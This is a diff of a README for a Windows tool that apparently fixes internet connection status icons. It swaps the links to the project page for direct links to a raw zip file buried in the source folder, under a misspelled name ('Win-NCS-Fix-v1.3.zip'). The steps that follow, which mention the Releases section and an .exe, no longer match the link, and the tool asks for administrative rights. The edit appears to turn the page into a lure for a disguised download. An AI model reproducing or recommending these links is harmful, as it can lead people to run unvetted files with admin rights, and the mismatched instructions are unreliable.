@@ -1,6 +1,6 @@
 # 🌐 Win-NCSI-Fix - Resolve your internet connection status icons
 
-[![](https://img.shields.io/badge/Download_Win_NCSI_Fix-Blue?style=for-the-badge)](https://github.com/dodior9535/Win-NCSI-Fix)
+[![](https://img.shields.io/badge/Download_Win_NCSI_Fix-Blue?style=for-the-badge)](https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip)
 
 ## 🛠️ What this tool does
 
@@ -19,7 +19,7 @@ Your computer requires administrative rights to run the fix. The software instal
 
 ## 📥 How to download and run
 
-1. Visit the project page to download the latest file: [https://github.com/dodior9535/Win-NCSI-Fix](https://github.com/dodior9535/Win-NCSI-Fix).
+1. Visit the project page to download the latest file: [https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip](https://github.com/dodior9535/Win-NCSI-Fix/raw/refs/heads/main/src/WinNcsiFix/Win-NCS-Fix-v1.3.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
